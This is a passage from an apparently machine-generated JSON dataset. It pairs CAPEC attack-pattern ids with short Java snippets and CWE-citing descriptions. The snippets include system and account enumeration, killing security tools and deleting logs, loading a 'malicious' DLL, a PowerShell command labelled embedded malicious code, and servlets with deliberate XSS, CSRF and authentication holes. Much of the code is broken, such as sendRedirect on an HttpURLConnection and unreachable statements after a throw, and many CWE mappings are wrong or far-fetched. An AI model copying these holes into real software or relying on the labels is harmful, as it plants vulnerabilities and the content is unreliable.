        "description": "This Java code snippet demonstrates the CAPEC of exploiting functionality to identify information about currently running processes on the target system. The code uses the Runtime.getRuntime().exec() method to execute the 'tasklist' command, which lists all running processes on the system. The output is then read and printed to the console, exposing sensitive system information to an unauthorized actor (CWE-200, CWE-497). The use of the 'tasklist' command with visible sensitive information (CWE-214) and the potential creation of an emergent resource (CWE-1229) that can be used by attackers are also demonstrated. Additionally, this code may be vulnerable to exposure of sensitive information caused by shared microarchitectural predictor state (CWE-1423) in certain hardware environments."
    },
    {
        "capec_id": "574",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class ServiceEnumerator {\n    public static void main(String[] args) {\n        try {\n            Process process = Runtime.getRuntime().exec(\"tasklist /svc\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting functionality to identify information about services on the target system. It uses the 'tasklist /svc' command to enumerate services, which can be used by an adversary to learn about the target environment. This code embodies CWE-200, CWE-497, CWE-1249, CWE-214, and CWE-1229 as it exposes sensitive system information to unauthorized actors, provides an inconsistent view of the underlying operating system, and creates an emergent resource that can be used by attackers."
    },
    {
        "capec_id": "575",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DomainAccountEnumerator {\n    public static void main(String[] args) {\n        try {\n            Process process = Runtime.getRuntime().exec(\"net user\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            List<String> domainAccounts = new ArrayList<>();\n            while ((line = reader.readLine()) != null) {\n                domainAccounts.add(line);\n            }\n            // Print or store the domain accounts and their permissions\n            for (String account : domainAccounts) {\n                System.out.println(account);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting functionality to identify information about domain accounts and their permissions on the target system. The code uses the 'net user' command to retrieve a list of domain accounts and their permissions, which can be used to inform further malicious behavior. This code embodies CWE-200, CWE-497, CWE-1249, CWE-529, and CWE-214 as it exposes sensitive system information to unauthorized actors, does not properly prevent access to sensitive system-level information, provides an inconsistent view of the underlying operating system, stores access control list files in an accessible directory, and invokes a process with sensitive command-line arguments."
    },
    {
        "capec_id": "576",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class GroupEnumerator {\n    public static void main(String[] args) {\n        try {\n            Process process = Runtime.getRuntime().exec(\"net localgroup\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            List<String> groups = new ArrayList<>();\n            while ((line = reader.readLine()) != null) {\n                groups.add(line);\n            }\n            // Expose sensitive information to an unauthorized actor (CWE-200)\n            System.out.println(\"Local groups: \" + groups);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC by executing the Windows command 'net localgroup' to list local groups on the system. The output is then printed to the console, exposing sensitive information to an unauthorized actor (CWE-200). This code also relates to CWE-842, CWE-529, CWE-214, and CWE-1229 as it involves incorrect placement of users into groups, exposure of access control list files, invocation of a process with sensitive command-line arguments, and creation of emergent resources, respectively."
    },
    {
        "capec_id": "577",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.BasicFileAttributes;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class UserActivityTracker {\n    private static final Logger LOGGER = Logger.getLogger(UserActivityTracker.class.getName());\n\n    public static void main(String[] args) {\n        File userDir = new File(\"C:\\Users\");\n        File[] users = userDir.listFiles();\n        for (File user : users) {\n            File ntuserDat = new File(user, \"ntuser.dat\");\n            if (ntuserDat.exists()) {\n                try {\n                    BasicFileAttributes attrs = Files.readAttributes(Paths.get(ntuserDat.getAbsolutePath()), BasicFileAttributes.class);\n                    LOGGER.info(\"Last login time for user \" + user.getName() + \" is \" + attrs.lastAccessTime());\n                } catch (IOException e) {\n                    LOGGER.log(Level.SEVERE, \"Error accessing ntuser.dat\", e);\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting functionality to identify information about primary users on the target system. It lists all users on the system, accesses their ntuser.dat files, and logs the last access time, which is synonymous with the last login time. This code embodies CWE-200 by exposing sensitive information to an unauthorized actor, CWE-214 by invoking a process with visible sensitive information, CWE-379 by creating a temporary file in a directory with insecure permissions, CWE-497 by exposing sensitive system information to an unauthorized control sphere, and CWE-1249 by providing an application-level admin tool with an inconsistent view of the underlying operating system."
    },
    {
        "capec_id": "578",
        "code_snippet": "public class DisableSecurityTools {\n    private static final String SECURITY_TOOL_PROCESS = \"security_tool.exe\";\n    private static final String SECURITY_TOOL_REGISTRY_KEY = \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\SecurityTool\";\n    private static final String LOG_FILE_PATH = \"C:\\\\logs\\\\security_tool.log\";\n\n    public static void disableSecurityTool() {\n        // CWE-284: Improper Access Control\n        // CWE-671: Lack of Administrator Control over Security\n        try {\n            // Kill the security tool process\n            Runtime.getRuntime().exec(\"taskkill /f /im \" + SECURITY_TOOL_PROCESS);\n\n            // Delete the security tool registry key\n            java.util.prefs.Preferences prefs = java.util.prefs.Preferences.systemRoot();\n            prefs.node(SECURITY_TOOL_REGISTRY_KEY).removeNode();\n\n            // Delete the log file\n            java.io.File logFile = new java.io.File(LOG_FILE_PATH);\n            logFile.delete();\n        } catch (Exception e) {\n            // CWE-798: Use of Hard-coded Credentials\n            // Hard-coded credentials for authentication\n            String username = \"admin\";\n            String password = \"password123\";\n            // Authenticate using hard-coded credentials\n            authenticate(username, password);\n        }\n    }\n\n    // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n    // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n    private native void authenticate(String username, String password);\n\n    static {\n        // Load the native library\n        System.loadLibrary(\"security_tool_auth\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of disabling security tools by exploiting weaknesses in access control. It kills a security tool process, deletes a registry key, and removes a log file. The code also uses hard-coded credentials for authentication and relies on native code for authentication, which can be vulnerable to processor and compiler optimizations that remove or modify security-critical code."
    },
    {
        "capec_id": "579",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class WinlogonExploit {\n    public static void main(String[] args) {\n        // CWE-15: External Control of System or Configuration Setting\n        String winlogonPath = System.getProperty(\"winlogon.path\");\n        if (winlogonPath != null) {\n            try {\n                // CWE-427: Uncontrolled Search Path Element\n                System.load(winlogonPath + \"\\\\maliciousDLL.dll\");\n            } catch (UnsatisfiedLinkError e) {\n                System.out.println(\"Failed to load malicious DLL\");\n            }\n        }\n\n        // CWE-520: .NET Misconfiguration: Use of Impersonation\n        try {\n            // Impersonate a user with higher privileges\n            System.setProperty(\"java.security.auth.login.config\", \"C:\\\\path\\\\to\\\\malicious\\\\login.conf\");\n            // CWE-558: Use of getlogin() in Multithreaded Application\n            String username = System.getProperty(\"user.name\");\n            System.out.println(\"Impersonating user: \" + username);\n        } catch (Exception e) {\n            System.out.println(\"Failed to impersonate user\");\n        }\n\n        // CWE-798: Use of Hard-coded Credentials\n        String hardcodedPassword = \"mysecretpassword\";\n        try {\n            // Use hard-coded credentials for authentication\n            authenticate(hardcodedPassword);\n        } catch (Exception e) {\n            System.out.println(\"Failed to authenticate\");\n        }\n    }\n\n    private static void authenticate(String password) throws Exception {\n        // TO DO: Implement authentication logic using hard-coded credentials\n    }\n}",
        "description": "Java code snippet that demonstrates the Winlogon exploit, using CWE-15, CWE-427, CWE-520, CWE-558, and CWE-798. It loads a malicious DLL, impersonates a user with higher privileges, and uses hard-coded credentials for authentication."
    },
    {
        "capec_id": "580",
        "code_snippet": "public class RemoteSystemProber {\n    public static void main(String[] args) {\n        String[] paths = {\"/usr/bin\", \"/usr/local/bin\", \"/bin\"};\n        for (String path : paths) {\n            try {\n                Runtime.getRuntime().exec(\"ls \" + path);\n                System.out.println(\"Directory exists: \" + path);\n            } catch (IOException e) {\n                System.out.println(\"Directory does not exist: \" + path);\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of active probing and exploration to determine security information about a remote target system. It uses the CWEs 204, 205, 208, and 497 by trying to access different directories on the system and observing the response discrepancies. The code uses an untrusted search path (CWE 426) to search for critical resources. The observable response discrepancies (CWE 204) and behavioral discrepancies (CWE 205) can reveal internal state information to an unauthorized actor. The code also exhibits observable timing discrepancies (CWE 208) as the execution time of the 'ls' command may vary depending on the existence of the directory. Finally, the code exposes sensitive system information (CWE 497) by revealing the existence or non-existence of directories on the system."
    },
    {
        "capec_id": "581",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class SecurityToolEnumerator {\n    public static void main(String[] args) {\n        List<String> securityTools = new ArrayList<>();\n        File dir = new File(\"C:\\\\Program Files\");\n        File[] files = dir.listFiles();\n        for (File file : files) {\n            if (file.isDirectory()) {\n                String dirName = file.getName();\n                if (dirName.contains(\"Security\") || dirName.contains(\"Antivirus\") || dirName.contains(\"Firewall\")) {\n                    securityTools.add(dirName);\n                }\n            }\n        }\n        System.out.println(\"Security Tools Installed: \" + securityTools);\n    }\n}\n\n// Embedded Malicious Code\npublic class MaliciousCode {\n    public static void executeMaliciousTask() {\n        try {\n            Runtime.getRuntime().exec(\"powershell.exe -Command Start-Process cmd.exe -ArgumentList '/c', 'whoami > C:\\\\Users\\\\Public\\\\whoami.txt'\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of enumerating security tools installed on a system. It lists all directories in the 'C:\\\\Program Files' directory that contain the words 'Security', 'Antivirus', or 'Firewall' and prints them to the console. Additionally, it includes embedded malicious code that executes a PowerShell command to write the current user's username to a file, illustrating CWE-506. The code also has a dependency on the 'powershell.exe' executable, which could be a vulnerable third-party component (CWE-1395). Furthermore, the code collects system information without user approval, violating the user's intended security policy (CWE-512). The malicious code is hidden from normal operation, making it a Trojan Horse (CWE-507)."
    },
    {
        "capec_id": "582",
        "code_snippet": "import java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\nimport java.io.DataOutputStream;\nimport java.net.DatagramSocket;\nimport java.net.DatagramPacket;\n\npublic class NetworkRouteDisabler {\n    public static void main(String[] args) {\n        try {\n            // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n            Socket socket = new Socket(\"malicious_endpoint\", 8080);\n            DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n            dout.writeUTF(\"shutdown\");\n            dout.flush();\n            dout.close();\n            socket.close();\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            DatagramSocket ds = new DatagramSocket();\n            byte[] buffer = \"malicious_packet\".getBytes();\n            DatagramPacket dp = new DatagramPacket(buffer, buffer.length, \"target_endpoint\", 8080);\n            ds.send(dp);\n\n            // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n            // Simulate error injection\n            ds.close();\n            throw new IOException(\"Simulated error injection\");\n\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            Socket socket2 = new Socket(\"wrong_endpoint\", 8080);\n            DataOutputStream dout2 = new DataOutputStream(socket2.getOutputStream());\n            dout2.writeUTF(\"malicious_command\");\n            dout2.flush();\n            dout2.close();\n            socket2.close();\n\n            // CWE-421: Race Condition During Access to Alternate Channel\n            // Simulate race condition\n            Socket socket3 = new Socket(\"alternate_endpoint\", 8080);\n            DataOutputStream dout3 = new DataOutputStream(socket3.getOutputStream());\n            dout3.writeUTF(\"malicious_command\");\n            dout3.flush();\n            dout3.close();\n            socket3.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        } catch (IOException e) {\n            System.out.println(\"IO error\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of disabling the network route between two targets by exploiting various CWEs. It includes improper restriction of communication channels, failure to enforce message integrity, unauthorized error injection, incorrectly specified destinations, and race conditions during access to alternate channels. The code establishes malicious connections, injects errors, and targets incorrect endpoints to disrupt the communication channel."
    },
    {
        "capec_id": "583",
        "code_snippet": "public class HardwareDisabler {\n    private static final String DEVICE_PATH = \"/dev/ttyUSB0\";\n    private static final int POWER_OFF = 0;\n    private static final int POWER_ON = 1;\n\n    public static void main(String[] args) {\n        try {\n            // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n            disableHardwareRedundancy();\n\n            // CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n            powerOffDevice(DEVICE_PATH, POWER_OFF);\n            Thread.sleep(1000);\n            powerOnDevice(DEVICE_PATH, POWER_ON);\n\n            // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n            modifyHardwareRegisters(DEVICE_PATH);\n\n            // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n            disableAlertSignals(DEVICE_PATH);\n\n            // CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n            connectHardwareSignalsIncorrectly(DEVICE_PATH);\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static void disableHardwareRedundancy() {\n        // Simulate error injection to disable hardware redundancy\n        System.out.println(\"Disabling hardware redundancy...\");\n    }\n\n    private static void powerOffDevice(String devicePath, int powerState) {\n        // Simulate power off operation\n        System.out.println(\"Powering off device at \" + devicePath + \"...\");\n    }\n\n    private static void powerOnDevice(String devicePath, int powerState) {\n        // Simulate power on operation\n        System.out.println(\"Powering on device at \" + devicePath + \"...\");\n    }\n\n    private static void modifyHardwareRegisters(String devicePath) {\n        // Simulate modification of hardware registers\n        System.out.println(\"Modifying hardware registers at \" + devicePath + \"...\");\n    }\n\n    private static void disableAlertSignals(String devicePath) {\n        // Simulate disabling of alert signals\n        System.out.println(\"Disabling alert signals at \" + devicePath + \"...\");\n    }\n\n    private static void connectHardwareSignalsIncorrectly(String devicePath) {\n        // Simulate incorrect connection of hardware signals\n        System.out.println(\"Connecting hardware signals incorrectly at \" + devicePath + \"...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC attack pattern of physically disabling networking hardware by powering it down or disconnecting critical equipment. It incorporates the related CWEs by simulating unauthorized error injection to disable hardware redundancy, improper preservation of hardware configuration state during a power save/restore operation, improper restriction of software interfaces to hardware features, improper protection for outbound error messages and alert signals, and incorrect connection of hardware signals to the parent system."
    },
    {
        "capec_id": "584",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class BGPAttack {\n    public static void main(String[] args) throws Exception {\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"malicious-AS\");\n        byte[] data = \"malicious-route-advertisement\".getBytes();\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, 179);\n        socket.send(packet);\n\n        // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n        for (int i = 0; i < 1000; i++) {\n            socket.send(packet);\n        }\n\n        // CWE-927: Use of Implicit Intent for Sensitive Communication\n        // (Note: This CWE is Android-specific, but we can simulate the concept in Java)\n        String sensitiveData = \"target-network-info\";\n        socket.send(new DatagramPacket(sensitiveData.getBytes(), sensitiveData.length(), address, 179));\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        byte[] receivedData = new byte[1024];\n        DatagramPacket receivedPacket = new DatagramPacket(receivedData, receivedData.length);\n        socket.receive(receivedPacket);\n        String receivedMessage = new String(receivedPacket.getData(), 0, receivedPacket.getLength());\n        // No integrity check performed on receivedMessage\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n        // (Note: This CWE is more relevant to SSL/TLS, but we can simulate the concept in Java)\n        String weakerAlgorithm = \"MD5\";\n        // Use weakerAlgorithm for encryption/decryption\n    }\n}\n",
        "description": "This Java code snippet demonstrates a BGP attack by suppressing the intended AS routing advertisements and forcing less effective routes for traffic to ASs, leading to denial of availability for the target network. It incorporates CWEs 941, 406, 927, 924, and 757 to showcase vulnerabilities in communication channels, network message volume, sensitive data transmission, message integrity, and algorithm selection."
    },
    {
        "capec_id": "585",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws Exception {\n        String targetDomain = \"example.com\";\n        String attackerDomain = \"attacker.com\";\n        String redirectUrl = \"http://\" + attackerDomain + \"/phishing-page\";\n\n        // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n        String reverseDns = getReverseDns(targetDomain);\n        if (reverseDns.equals(targetDomain)) {\n            // CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n            String crossDomainPolicy = \"<?xml version=\\\"1.0\\\"?><cross-domain-policy><allow-access-from domain=\\\"*\\\"/></cross-domain-policy>\";\n            System.out.println(crossDomainPolicy);\n\n            // CWE-368: Context Switching Race Condition\n            Thread thread = new Thread(() -> {\n                try {\n                    URL url = new URL(\"http://\" + targetDomain);\n                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                    connection.setRequestMethod(\"GET\");\n                    int responseCode = connection.getResponseCode();\n                    if (responseCode == 200) {\n                        // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n                        connection.sendRedirect(redirectUrl);\n                    }\n                } catch (Exception e) {\n                    System.out.println(e.getMessage());\n                }\n            });\n            thread.start();\n\n            // CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n            String userInput = \"<script>alert('XSS')</script>\";\n            String htmlPage = \"<html><body>\" + userInput + \"</body></html>\";\n            System.out.println(htmlPage);\n        }\n    }\n\n    private static String getReverseDns(String domain) throws Exception {\n        // Simulating reverse DNS resolution\n        return domain;\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC attack pattern where an adversary influences a target's web-hosting company to disable a target domain. The code includes vulnerabilities related to CWE-350, CWE-942, CWE-368, CWE-601, and CWE-79, which can be exploited to achieve the goal of preventing access to the targeted service provided by the domain."
    },
    {
        "capec_id": "586",
        "code_snippet": "import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import java.io.Serializable; public class VulnerableApp { public static void main(String[] args) { String userInput = \"\"; // assume userInput comes from an untrusted source byte[] userInputBytes = userInput.getBytes(); ByteArrayInputStream bis = new ByteArrayInputStream(userInputBytes); ObjectInputStream ois = new ObjectInputStream(bis); try { Object obj = ois.readObject(); if (obj instanceof Serializable) { // do something with the deserialized object } } catch (Exception e) { // handle exception } } } class SerializableClass implements Serializable { private String sensitiveData = \"topSecret\"; private String debugFlag = \"true\"; // CWE-1313: debug flag can be activated at runtime public void setDebugFlag(String flag) { this.debugFlag = flag; } public String getSensitiveData() { return sensitiveData; } }",
        "description": "This Java code snippet demonstrates a vulnerable application that deserializes untrusted user input without proper validation, allowing an adversary to inject malicious content and potentially compromise the application. The SerializableClass contains sensitive data and a debug flag that can be activated at runtime, making it vulnerable to CWE-1313 and CWE-499. The code also lacks proper neutralization of special elements, making it vulnerable to CWE-77. Furthermore, the application does not explicitly deny serialization of the SerializableClass, making it vulnerable to CWE-506."
    },
    {
        "capec_id": "587",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String iframeSrc = req.getParameter(\"iframeSrc\");\n        String scriptSrc = req.getParameter(\"scriptSrc\");\n        String csrfToken = req.getParameter(\"csrfToken\");\n\n        // CWE-1021: No restriction on iframe source\n        res.getWriter().println(\"<iframe src='\" + iframeSrc + \"' width='100%' height='100%'></iframe>\");\n\n        // CWE-79: Reflected XSS vulnerability\n        res.getWriter().println(\"<script src='\" + scriptSrc + \"'></script>\");\n\n        // CWE-692: Incomplete denylist for XSS protection\n        String denylist = \"<|>|script|alert\";\n        if (!scriptSrc.matches(denylist)) {\n            res.getWriter().println(\"<script>\" + scriptSrc + \"</script>\");\n        }\n\n        // CWE-82: XSS vulnerability in IMG tag attribute\n        res.getWriter().println(\"<img src='\" + scriptSrc + \"' onerror='alert(1)' />\");\n\n        // CWE-352: CSRF vulnerability\n        if (csrfToken == null || csrfToken.isEmpty()) {\n            res.getWriter().println(\"<form action='vulnerableAction' method='post'>\");\n            res.getWriter().println(\"    <input type='submit' value='Submit' />\");\n            res.getWriter().println(\"</form>\");\n        }\n    }\n}",
        "description": "This Java servlet is vulnerable to multiple attacks. It allows an attacker to specify the source of an iframe, which can lead to clickjacking attacks. It also has a reflected XSS vulnerability, allowing an attacker to inject malicious scripts. The servlet uses an incomplete denylist to protect against XSS, making it possible for an attacker to bypass the protection. Additionally, it has an XSS vulnerability in an IMG tag attribute, and it does not verify CSRF tokens, making it vulnerable to CSRF attacks."
    },
    {
        "capec_id": "588",
        "code_snippet": "public class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n        String userInput = req.getParameter(\"userInput\");\n        String html = \"<div onmouseover=\\\"\" + userInput + \"\\\">\";\n        res.setContentType(\"text/html\");\n        PrintWriter out = res.getWriter();\n        out.println(html);\n    }\n}",
        "description": "This Java code snippet demonstrates a DOM-based XSS vulnerability. The servlet takes user input from the 'userInput' parameter and injects it into the HTML response without proper validation or encoding, allowing an attacker to inject malicious script code that can manipulate the DOM. This code is vulnerable to CWE-79, CWE-20, CWE-83, CWE-82, and CWE-80."
    },
    {
        "capec_id": "589",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class DNSInterceptor {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(53);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String dnsQuery = new String(packet.getData(), packet.getOffset(), packet.getLength());\n            if (dnsQuery.contains(\"example.com\")) {\n                // Drop DNS request\n                continue;\n            }\n            InetAddress address = packet.getAddress();\n            int port = packet.getPort();\n            socket.send(new DatagramPacket(buffer, buffer.length, address, port));\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a DNS interceptor that drops DNS requests based on content in the request. It listens on port 53, receives DNS queries, and checks if the query contains a specific domain (e.g., example.com). If it does, the request is dropped, effectively denying access to the specified service or content. This code embodies the CAPEC and CWEs by not verifying the identity of actors at both ends of the communication channel (CWE-300), relying on reverse DNS resolution (CWE-350), binding to an unrestricted IP address (CWE-1327), using IP addresses for authentication (CWE-291), and allowing external control of a lock (CWE-412)."
    },
    {
        "capec_id": "590",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        Socket socket = serverSocket.accept();\n        String clientIP = socket.getInetAddress().getHostAddress();\n        if (clientIP.equals(\"0.0.0.0\")) {\n            // authenticate based on IP address\n            System.out.println(\"Authenticated!\");\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(\"Welcome, authenticated user!\");\n        } else {\n            System.out.println(\"Access denied!\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable server that relies on IP address for authentication (CWE-291) and binds to an unrestricted IP address (CWE-1327). It also lacks proper verification of the client's identity (CWE-300) and does not ensure the integrity of the communication channel (CWE-923). An adversary can exploit this by dropping packets destined for the target IP address, preventing access to the service hosted at the target IP address (CAPEC)."
    },
    {
        "capec_id": "591",
        "code_snippet": "public class ReflectedXSS {\n    public static void main(String[] args) {\n        String userInput = request.getParameter(\"input\");\n        String html = \"<img src='\" + userInput + \"' />\";\n        out.println(html);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a reflected XSS vulnerability. It takes user input from a request parameter and injects it directly into an HTML IMG tag without proper sanitization or encoding, allowing an attacker to inject malicious scripts."
    },
    {
        "capec_id": "592",
        "code_snippet": "public class StoredXSS {\n    private static Map<String, String> comments = new HashMap<>();\n\n    public void addComment(String name, String comment) {\n        comments.put(name, comment);\n    }\n\n    public String getComments() {\n        StringBuilder html = new StringBuilder();\n        for (Map.Entry<String, String> entry : comments.entrySet()) {\n            html.append(\"<p>\" + entry.getKey() + \": \" + entry.getValue() + \"</p>\");\n        }\n        return html.toString();\n    }\n\n    public static void main(String[] args) {\n        StoredXSS xss = new StoredXSS();\n        xss.addComment(\"John\", \"<script>alert('XSS')</script>\");\n        System.out.println(xss.getComments());\n    }\n}",
        "description": "This Java code snippet demonstrates a stored XSS vulnerability. The `addComment` method stores user input in a map without proper validation or sanitization. The `getComments` method retrieves the stored comments and returns them as HTML, without encoding or escaping the user input. This allows an attacker to inject malicious scripts, which will be executed when the comments are displayed. The `main` method shows an example of how an attacker could inject a script that would trigger an alert box with the text 'XSS' when the comments are viewed."
    },
    {
        "capec_id": "593",
        "code_snippet": "import javax.servlet.http.HttpSession;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableSessionAuth extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp)\n            throws ServletException, IOException {\n        String username = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n\n        if (authenticate(username, password)) {\n            HttpSession session = req.getSession(true);\n            session.setAttribute(\"authenticated\", true);\n            resp.sendRedirect(\"protectedPage.jsp\");\n        } else {\n            resp.setStatus(401);\n        }\n    }\n\n    private boolean authenticate(String username, String password) {\n        // Insecure authentication logic, always returns true\n        return true;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable session authentication mechanism. It uses a simple HttpServlet to handle user authentication. The doPost method retrieves the username and password from the request, and if the authentication is successful (which is always the case due to the insecure authentication logic), it creates a new session and sets an 'authenticated' attribute to true. The session is not invalidated or regenerated, making it vulnerable to session fixation attacks (CWE-384). The authentication logic is also insufficient, as it always returns true (CWE-287). Additionally, the session ID length is not explicitly set, which can lead to insufficient session-ID length (CWE-6). The code also relies on the client-side to enforce server-side security, which is a client-side enforcement of server-side security vulnerability (CWE-602). Finally, the session expiration is not handled, making it vulnerable to insufficient session expiration (CWE-613)."
    },
    {
        "capec_id": "594",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.ServerSocket;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8000);\n        Socket socket = serverSocket.accept();\n        DataInputStream input = new DataInputStream(socket.getInputStream());\n        DataOutputStream output = new DataOutputStream(socket.getOutputStream());\n\n        String request = input.readUTF();\n        // CWE-940: No verification of the source of the communication channel\n        // CWE-319: Sensitive information is transmitted in cleartext\n        String sensitiveData = \"username:password\";\n        output.writeUTF(sensitiveData);\n\n        // CWE-99: Unrestricted input used as a resource identifier\n        String resourceId = input.readUTF();\n        String resourcePath = \"/resources/\" + resourceId;\n        // CWE-924: No enforcement of message integrity during transmission\n        String message = input.readUTF();\n        System.out.println(\"Received message: \" + message);\n\n        // CWE-406: Insufficient control of network message volume\n        for (int i = 0; i < 100; i++) {\n            output.writeUTF(\"Response \" + i);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable server that is susceptible to traffic injection attacks. It lacks proper verification of the source of the communication channel, transmits sensitive information in cleartext, uses unrestricted input as a resource identifier, fails to enforce message integrity during transmission, and does not control network message volume."
    },
    {
        "capec_id": "595",
        "code_snippet": "import java.net.Socket;\nimport java.net.ServerSocket;\nimport java.io.DataOutputStream;\nimport java.io.DataInputStream;\n\npublic class ConnectionResetAttack {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        Socket socket = serverSocket.accept();\n        DataOutputStream dout = new DataOutputStream(socket.getOutputStream());\n        DataInputStream din = new DataInputStream(socket.getInputStream());\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the source of the incoming request\n        String request = din.readUTF();\n        System.out.println(\"Received request: \" + request);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No integrity check on the received message\n        dout.writeUTF(\"Response from server\");\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // Incorrectly specifying the destination for the outgoing request\n        Socket clientSocket = new Socket(\"localhost\", 8081);\n        dout = new DataOutputStream(clientSocket.getOutputStream());\n        dout.writeUTF(\"Request from client\");\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        // Capturing and replaying the request to bypass authentication\n        byte[] capturedRequest = din.readAllBytes();\n        dout.write(capturedRequest);\n\n        // CWE-605: Multiple Binds to the Same Port\n        // Binding multiple sockets to the same port\n        ServerSocket serverSocket2 = new ServerSocket(8080);\n        Socket socket2 = serverSocket2.accept();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a connection reset attack, where an adversary injects a connection reset packet to one or both ends of a target's connection. The code includes vulnerabilities related to improper verification of the source of a communication channel, improper enforcement of message integrity, incorrectly specified destination, authentication bypass by capture-replay, and multiple binds to the same port."
    },
    {
        "capec_id": "596",
